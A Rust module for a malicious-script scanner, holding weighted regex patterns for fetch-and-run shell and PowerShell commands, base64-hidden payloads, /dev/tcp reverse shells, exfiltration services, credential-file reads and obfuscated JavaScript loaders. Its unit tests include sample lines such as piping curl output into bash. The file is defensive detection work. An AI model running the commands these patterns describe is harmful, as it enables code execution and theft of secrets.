//! Heuristics for spotting malicious script content. Each match carries a
//! weight; callers turn the strongest match into a severity.

use std::sync::OnceLock;

use regex::Regex;

use super::Severity;

pub struct Hit {
    pub reason: &'static str,
    pub severity: Severity,
    /// The text is deliberately disguised. Never true of ordinary source code,
    /// so these are worth reporting in any file, not just config files.
    pub hides: bool,
}

struct Pattern {
    re: Regex,
    reason: &'static str,
    severity: Severity,
    hides: bool,
}

fn patterns() -> &'static [Pattern] {
    static P: OnceLock<Vec<Pattern>> = OnceLock::new();
    P.get_or_init(|| {
        use Severity::*;
        let p = |re: &str, reason, severity| Pattern { re: Regex::new(re).unwrap(), reason, severity, hides: false };
        let hidden = |re: &str, reason| Pattern { re: Regex::new(re).unwrap(), reason, severity: High, hides: true };
        vec![
            p(r"(?i)\b(curl|wget)\b[^\n|;]*\|\s*(sudo\s+)?(ba|z|da|k)?sh\b", "downloads a script and runs it straight away (curl | sh)", High),
            p(r"(?i)base64\s+(-d|--decode|-D)\b[^\n]*\|\s*(ba|z)?sh", "decodes hidden base64 code and runs it", High),
            hidden(r"(?i)\beval\s*\(\s*(atob|Buffer\.from)\s*\(", "evaluates base64-hidden JavaScript"),
            hidden(r"(?i)new\s+Function\s*\(\s*(atob|Buffer\.from)", "builds code from base64-hidden text"),
            p(r"/dev/tcp/\d", "opens a raw network connection (reverse shell pattern)", High),
            p(r"(?i)(webhook\.site|pastebin\.com/raw|transfer\.sh|api\.telegram\.org/bot|discord(app)?\.com/api/webhooks|ngrok\.io|ngrok-free\.app)", "talks to a service commonly used to exfiltrate data", High),
            p(r"(?i)\btrufflehog\b", "runs TruffleHog, a secret-hunting tool used by the Shai-Hulud worm", High),
            p(r"(?i)\bgit\s+push\b", "pushes code to a remote on its own", Medium),
            p(r"(?i)\bgit\s+(-c\s+user\.(name|email)|commit\s+[^\n]*--author)", "commits under a specific name/email", Medium),
            p(r"(?i)\bgh\s+(repo\s+create|api\s+-X\s*POST)", "creates GitHub repos or calls the GitHub API", Medium),
            p(r"(?i)(cat|readFileSync\(|open\()[^\n]{0,40}(\.npmrc|\.git-credentials|\.aws/credentials|\.ssh/id_)", "reads saved tokens or keys", High),
            p(r"(?i)\bnode\s+-e\s", "runs inline Node.js code", Medium),
            p(r"(?i)\bpython3?\s+-c\s[^\n]*(exec|base64|urllib|socket)", "runs inline Python that downloads or decodes code", Medium),
            // Windows
            p(r"(?i)(powershell|pwsh)(\.exe)?[^\n]*\s-(e|ec|enc|encodedcommand)\s+[A-Za-z0-9+/=]{20,}", "runs base64-hidden PowerShell code", High),
            p(r"(?i)(downloadstring|downloadfile|invoke-webrequest|invoke-restmethod|\biwr\b|\birm\b)[^\n]*(\|\s*(iex|invoke-expression)\b|;\s*(iex|invoke-expression)\b)", "downloads a PowerShell script and runs it straight away", High),
            p(r"(?i)\b(iex|invoke-expression)\s*\(?\s*\(?\s*(new-object\s+net\.webclient|iwr|irm|invoke-webrequest|invoke-restmethod)", "downloads a PowerShell script and runs it straight away", High),
            p(r"(?i)\bmshta(\.exe)?\s+[\x22']?(https?|javascript|vbscript):", "runs a script from the web with mshta", High),
            p(r"(?i)\bcertutil(\.exe)?\s[^\n]*-urlcache", "downloads a file with certutil (a common malware trick)", High),
            p(r"(?i)\bregsvr32(\.exe)?\s[^\n]*/i:https?:", "loads a script from the web with regsvr32", High),
            p(r"(?i)-(w|windowstyle)\s+hidden", "runs PowerShell in a hidden window", Medium),
            p(r"(?i)\bnohup\b[^\n]*&\s*$", "starts a hidden background process", Low),
            p(r#"(?i)\b(node|bun|deno|python3?|ruby|perl|osascript|bash|sh|zsh)\s+["']?(\$HOME|~|/Users/[^/\s]+|/home/[^/\s]+|/tmp|/private/tmp|/Users/Shared)/\.[^\s"']+"#, "runs a script from a hidden or temporary folder", Medium),
            hidden(r"_0x[0-9a-f]{4,6}\b[\s\S]{0,200}_0x[0-9a-f]{4,6}\b[\s\S]{0,200}_0x[0-9a-f]{4,6}\b", "contains obfuscated JavaScript (_0x… names)"),
            p(r#"(?i)require\(\s*['"](child_process|node:child_process)['"]\s*\)[\s\S]{0,400}(https?://|\.get\(|request\()"#, "starts programs and downloads from the internet", Medium),
            // BeaverTail / InvisibleFerret loaders hand `require` to their next stage through globals.
            hidden(r#"global\s*\[\s*['"](r|_V|!|\\u0021)['"]\s*\]\s*="#, "sets the global flags used by the BeaverTail / InvisibleFerret malware loader"),
        ]
    })
}

/// All reasons `text` looks suspicious, strongest first.
pub fn scan_text(text: &str) -> Vec<Hit> {
    let mut hits: Vec<Hit> = patterns()
        .iter()
        .filter(|p| p.re.is_match(text))
        .map(|p| Hit {
            reason: p.reason,
            severity: p.severity,
            hides: p.hides,
        })
        .collect();
    if text.lines().any(|l| l.len() > 5_000) {
        hits.push(Hit {
            reason: "has an extremely long single line (typical of hidden, minified malware)",
            severity: Severity::Medium,
            hides: false,
        });
    }
    // Code pushed far to the right with spaces or tabs so it's off-screen in editors and diffs.
    if text.lines().any(hidden_behind_whitespace) {
        hits.push(Hit {
            reason: "hides code far to the right behind a wall of spaces or tabs",
            severity: Severity::High,
            hides: true,
        });
    }
    if count(escaped_words(), text) >= 5 {
        hits.push(Hit {
            reason: "spells its words as \\u escape codes to hide them (obfuscated JavaScript)",
            severity: Severity::High,
            hides: true,
        });
    }
    if count(xor_numbers(), text) >= 5 {
        hits.push(Hit {
            reason: "hides its numbers as XOR sums (obfuscated JavaScript)",
            severity: Severity::High,
            hides: true,
        });
    }
    hits.sort_by_key(|h| std::cmp::Reverse(h.severity));
    hits
}

/// A run of 200+ spaces or tabs with code after it on the same line.
fn hidden_behind_whitespace(line: &str) -> bool {
    if line.len() < 300 || line.trim_start().len() <= 50 {
        return false;
    }
    let mut run = 0;
    for c in line.bytes() {
        if c == b' ' || c == b'\t' {
            run += 1;
        } else if run >= 200 {
            return true;
        } else {
            run = 0;
        }
    }
    false
}

/// `'\u006C\u0065\u006E…'`: plain letters written as escapes so text search misses them.
fn escaped_words() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| Regex::new(r"(?:\\u00[2-7][0-9A-Fa-f]){4,}").unwrap())
}

/// `274987^274987`: constants disguised as XOR sums.
fn xor_numbers() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| Regex::new(r"\b\d{4,}\s*\^\s*\d{4,}\b").unwrap())
}

fn count(re: &Regex, text: &str) -> usize {
    re.find_iter(text).take(5).count()
}

/// Only the signs of deliberately disguised code.
pub fn hidden_code(text: &str) -> Vec<Hit> {
    scan_text(text).into_iter().filter(|h| h.hides).collect()
}

pub fn worst(hits: &[Hit]) -> Option<Severity> {
    hits.iter().map(|h| h.severity).max()
}

/// First line matching any pattern, trimmed for display.
pub fn first_matching_line(text: &str) -> Option<(usize, String)> {
    text.lines().enumerate().find_map(|(i, l)| {
        let hit = !scan_text(l).is_empty();
        hit.then(|| (i + 1, excerpt(l)))
    })
}

pub fn excerpt(s: &str) -> String {
    let t = s.trim();
    if t.chars().count() > 200 {
        format!("{}…", t.chars().take(200).collect::<String>())
    } else {
        t.to_string()
    }
}

/// Show only the start of a secret: `ghp_abcd…`.
pub fn mask(secret: &str) -> String {
    let keep: String = secret.chars().take(8).collect();
    format!("{keep}…")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_common_bad_things() {
        assert_eq!(
            worst(&scan_text("curl -fsSL http://x.y/i | bash")),
            Some(Severity::High)
        );
        assert_eq!(worst(&scan_text("echo aGk= | base64 -d | sh")), Some(Severity::High));
        assert_eq!(worst(&scan_text("eval(atob('ZG9j'))")), Some(Severity::High));
        assert_eq!(
            worst(&scan_text("git push origin HEAD --force")),
            Some(Severity::Medium)
        );
        assert_eq!(worst(&scan_text("node ~/.cache/x/run.js")), Some(Severity::Medium));
        let padded = format!("module.exports = {{}};{}eval(x)", " ".repeat(400));
        assert_eq!(worst(&scan_text(&padded)), Some(Severity::High));
        let tabbed = format!(
            "{}function y7(R,c){{var n=[];for(var o=0;o<R.length;o++)n[o]=R[o];return n}}",
            "\t".repeat(300)
        );
        assert!(hidden_code(&tabbed)
            .iter()
            .any(|h| h.reason.contains("wall of spaces or tabs")));
    }

    #[test]
    fn detects_obfuscated_loaders() {
        let escaped = "R['\\u006C\\u0065\\u006E\\u0067\\u0074\\u0068'];".repeat(5);
        assert!(hidden_code(&escaped).iter().any(|h| h.reason.contains("escape codes")));
        let xor = (0..5)
            .map(|i| format!("o+={}^{};", 288002 + i, 288003 + i))
            .collect::<String>();
        assert!(hidden_code(&xor).iter().any(|h| h.reason.contains("XOR")));
        assert!(!hidden_code("global['!']='8-&&';").is_empty());
        assert!(!hidden_code("global[\"r\"] = require;").is_empty());
        // Ordinary code: accented text escapes, a hash mixing step, normal globals.
        assert!(hidden_code("const s = '\\u00e9\\u00e8\\u00ea\\u00eb'; h ^= 0x9e3779b9; global.fetch = f;").is_empty());
        let indented = format!("{}x", " ".repeat(250));
        assert!(hidden_code(&indented).is_empty());
    }

    #[test]
    fn ignores_normal_config() {
        assert!(scan_text(r#"eval "$(/opt/homebrew/bin/brew shellenv)""#).is_empty());
        assert!(
            scan_text("export NVM_DIR=\"$HOME/.nvm\"\n[ -s \"$NVM_DIR/nvm.sh\" ] && \\. \"$NVM_DIR/nvm.sh\"")
                .is_empty()
        );
        assert!(scan_text("npx lint-staged").is_empty());
        assert!(scan_text("source ~/.oh-my-zsh/oh-my-zsh.sh").is_empty());
        assert!(scan_text("export GITHUB_TOKEN=abc").is_empty());
        assert!(scan_text("module.exports = { content: ['./src/**/*.tsx'] }").is_empty());
    }
}
